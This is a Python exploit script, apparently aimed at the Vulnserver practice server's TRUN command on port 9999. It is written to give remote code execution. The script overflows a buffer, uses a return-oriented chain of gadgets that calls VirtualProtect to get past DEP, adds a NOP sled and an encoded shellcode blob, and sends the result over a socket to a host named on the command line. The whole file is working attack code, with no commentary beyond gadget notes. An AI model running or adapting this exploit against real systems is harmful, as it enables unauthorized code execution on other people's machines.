import sys, socket
from struct import pack

host = sys.argv[1]
port = 9999

def send_exploit_request():
    #max buffer 1448

    badchars = (
        b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
        b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
        b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
        b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
        b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
        b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
        b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
        b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
        b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

    shellcode =  b""
    shellcode += b"\xda\xc3\xd9\x74\x24\xf4\xbf\xa1\x16\xb7\xcb"
    shellcode += b"\x5a\x29\xc9\xb1\x52\x31\x7a\x17\x03\x7a\x17"
    shellcode += b"\x83\x63\x12\x55\x3e\x9f\xf3\x1b\xc1\x5f\x04"
    shellcode += b"\x7c\x4b\xba\x35\xbc\x2f\xcf\x66\x0c\x3b\x9d"
    shellcode += b"\x8a\xe7\x69\x35\x18\x85\xa5\x3a\xa9\x20\x90"
    shellcode += b"\x75\x2a\x18\xe0\x14\xa8\x63\x35\xf6\x91\xab"
    shellcode += b"\x48\xf7\xd6\xd6\xa1\xa5\x8f\x9d\x14\x59\xbb"
    shellcode += b"\xe8\xa4\xd2\xf7\xfd\xac\x07\x4f\xff\x9d\x96"
    shellcode += b"\xdb\xa6\x3d\x19\x0f\xd3\x77\x01\x4c\xde\xce"
    shellcode += b"\xba\xa6\x94\xd0\x6a\xf7\x55\x7e\x53\x37\xa4"
    shellcode += b"\x7e\x94\xf0\x57\xf5\xec\x02\xe5\x0e\x2b\x78"
    shellcode += b"\x31\x9a\xaf\xda\xb2\x3c\x0b\xda\x17\xda\xd8"
    shellcode += b"\xd0\xdc\xa8\x86\xf4\xe3\x7d\xbd\x01\x6f\x80"
    shellcode += b"\x11\x80\x2b\xa7\xb5\xc8\xe8\xc6\xec\xb4\x5f"
    shellcode += b"\xf6\xee\x16\x3f\x52\x65\xba\x54\xef\x24\xd3"
    shellcode += b"\x99\xc2\xd6\x23\xb6\x55\xa5\x11\x19\xce\x21"
    shellcode += b"\x1a\xd2\xc8\xb6\x5d\xc9\xad\x28\xa0\xf2\xcd"
    shellcode += b"\x61\x67\xa6\x9d\x19\x4e\xc7\x75\xd9\x6f\x12"
    shellcode += b"\xd9\x89\xdf\xcd\x9a\x79\xa0\xbd\x72\x93\x2f"
    shellcode += b"\xe1\x63\x9c\xe5\x8a\x0e\x67\x6e\x75\x66\x66"
    shellcode += b"\x5b\x1d\x75\x68\xa2\x66\xf0\x8e\xce\x88\x55"
    shellcode += b"\x19\x67\x30\xfc\xd1\x16\xbd\x2a\x9c\x19\x35"
    shellcode += b"\xd9\x61\xd7\xbe\x94\x71\x80\x4e\xe3\x2b\x07"
    shellcode += b"\x50\xd9\x43\xcb\xc3\x86\x93\x82\xff\x10\xc4"
    shellcode += b"\xc3\xce\x68\x80\xf9\x69\xc3\xb6\x03\xef\x2c"
    shellcode += b"\x72\xd8\xcc\xb3\x7b\xad\x69\x90\x6b\x6b\x71"
    shellcode += b"\x9c\xdf\x23\x24\x4a\x89\x85\x9e\x3c\x63\x5c"
    shellcode += b"\x4c\x97\xe3\x19\xbe\x28\x75\x26\xeb\xde\x99"
    shellcode += b"\x97\x42\xa7\xa6\x18\x03\x2f\xdf\x44\xb3\xd0"
    shellcode += b"\x0a\xcd\xc3\x9a\x16\x64\x4c\x43\xc3\x34\x11"
    shellcode += b"\x74\x3e\x7a\x2c\xf7\xca\x03\xcb\xe7\xbf\x06"
    shellcode += b"\x97\xaf\x2c\x7b\x88\x45\x52\x28\xa9\x4f"


    #pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9"
    command = b"TRUN " + b"A" * 1400

    vp = pack("<L", (0x45454545))         # dummy VirtualProtect addr  # -0x1c
    vp += pack("<L", (0x46464646))        # Shellcode return address   # -0x18
    vp += pack("<L", (0x47474747))        # dummy shellcode address    # -0x14
    vp += pack("<L", (0x48484848))        # dummy dwSize               # -0x10
    vp += pack("<L", (0x49494949))        # dummy flNewProtect         # -0x0c
    vp += pack("<L", (0x51515151))        # dummy lpflOldProtect       # -0x08
    vp += b"C" * 16

    offset = b"A" * (607 - len(vp))

    rop = pack("<L", 0x7e44fa77)          # mov edi, esp : dec ecx ; ret 0x4
    rop += pack("<L", 0x7e418c9f)         # pop eax ; pop ebp ;  retn 0x4
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x01477773)         # IAT addr of VP
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x7e440658)         # pop ebp ; pop ecx ; pop ebx ; retn 0x000
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0xfef8e9e1)         # offset to VP address
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x7e426d3f)         # add eax, ecx ; pop ebp ; retn 0x0004
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x7e4462ed)         # xchg eax, ecx
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x7e41927f)         # mov eax, dword [ecx] ; (VP addr in eax)
    rop += pack("<L", 0x7e461bc2)         # xchg eax, edx
    rop += pack("<L", 0x7e44d932)         # xchg eax, edi  (esp in eax)
    rop += pack("<L", 0x7e440658)         # pop ebp ; pop ecx ; pop ebx ; retn 0x0004
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0xffffffd4)         # offset to VP address
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x7e426d3f)         # add eax, ecx ; pop ebp ; retn 0x0004
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x7e4462ed)         # xchg eax, ecx
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x7e461bc2)         # xchg eax, edx
    rop += pack("<L", 0x7e4506eb)         # mov dword [ecx], eax ; mov eax, edi ; pop edi ; pop esi ; pop ebp ; retn 0x0008 ;  (1 found)
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk


    # updating shellcode return address

    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x7e44fa77)         # mov edi, esp : dec ecx ; ret 0x4
    rop += pack("<L", 0x7e418634)         # inc eax ; pop esi
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x12121212)
    rop += pack("<L", 0x7e419537)         # add edi, esi
    rop += pack("<L", 0x7e418634)         # inc eax ; pop esi
    rop += pack("<L", 0xededef0e+0x90)
    rop += pack("<L", 0x7e419537)         # add edi, esi
    rop += pack("<L", 0x7e44d932)         # xchg eax, edi
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x7e418634)         # inc eax ; pop esi
    rop += pack("<L", 0x62507f10)         # code cave essfunc.dll
    rop += pack("<L", 0x7e43fde7)         # dec eax
    rop += pack("<L", 0x7e4506eb)         # mov dword [ecx], eax ; mov eax, edi ; pop edi ; pop esi ; pop ebp ; retn 0x0008 ;  (1 found)

    # updating shellcode address

    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x7e44fa77)         # mov edi, esp : dec ecx ; ret 0x4
    rop += pack("<L", 0x7e418634)         # inc eax ; pop esi
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x12121212)
    rop += pack("<L", 0x7e419537)         # add edi, esi
    rop += pack("<L", 0x7e418634)         # inc eax ; pop esi
    rop += pack("<L", 0xededef0e-0x5c+0x90)
    rop += pack("<L", 0x7e419537)         # add edi, esi
    rop += pack("<L", 0x7e44d932)         # xchg eax, edi
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x7e4506eb)         # mov dword [ecx], eax ; mov eax, edi ; pop edi ; pop esi ; pop ebp ; retn 0x0008 ;  (1 found)

    # updating dwSize (0x600)

    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x7e418634)         # inc eax ; pop esi
    rop += pack("<L", 0x77777777)
    rop += pack("<L", 0x7e41e9f5)         # inc eax ; pop edi 
    rop += pack("<L", 0x88888e89)         # 
    rop += pack("<L", 0x7e419537)         # add edi, esi (600 in edi)
    rop += pack("<L", 0x7e44d932)         # xchg eax, edi
    rop += pack("<L", 0x7e4506eb)         # mov dword [ecx], eax ; mov eax, edi ; pop edi ; pop esi ; pop ebp ; retn 0x0008

    # updating flNewProtect (0x40)

    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x7e418634)         # inc eax ; pop esi
    rop += pack("<L", 0x77777777)
    rop += pack("<L", 0x7e41e9f5)         # inc eax ; pop edi 
    rop += pack("<L", 0x888888c9)         # 
    rop += pack("<L", 0x7e419537)         # add edi, esi (600 in edi)
    rop += pack("<L", 0x7e44d932)         # xchg eax, edi
    rop += pack("<L", 0x7e4506eb)         # mov dword [ecx], eax ; mov eax, edi ; pop edi ; pop esi ; pop ebp ; retn 0x0008

    # updating lpOldProtect (writable dword)

    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x7e43c8b2)         # inc ecx
    rop += pack("<L", 0x7e41e9f5)         # inc eax ; pop edi 
    rop += pack("<L", 0x62502004)
    rop += pack("<L", 0x7e44d932)         # xchg eax, edi
    rop += pack("<L", 0x7e4506eb)         # # mov dword [ecx], eax ; mov eax, edi ; pop edi ; pop esi ; pop ebp ; retn 0x0008

    # Align esp with VP address

    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x7e44fa77)         # mov edi, esp : dec ecx ; ret 0x4
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0x7e418634)         # inc eax ; pop esi
    rop += pack("<L", 0x44444444)         # junk
    rop += pack("<L", 0xfffffdec)
    rop += pack("<L", 0x7e419537)         # add edi, esi (600 in edi)
    rop += pack("<L", 0x7e44d932)         # xchg eax, edi
    rop += pack("<L", 0x7e451509)         # xchg eax, esp

    nop = b"\x90" * 100

    end = b"."
    
    buf = command + offset + vp + rop + nop + shellcode + end

    print("[+] Sending evil buffer")
    print("[+] Exp len: ", len(buf))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(buf)
    s.recv(1024)
    s.close()

if __name__ == "__main__": 

    send_exploit_request()
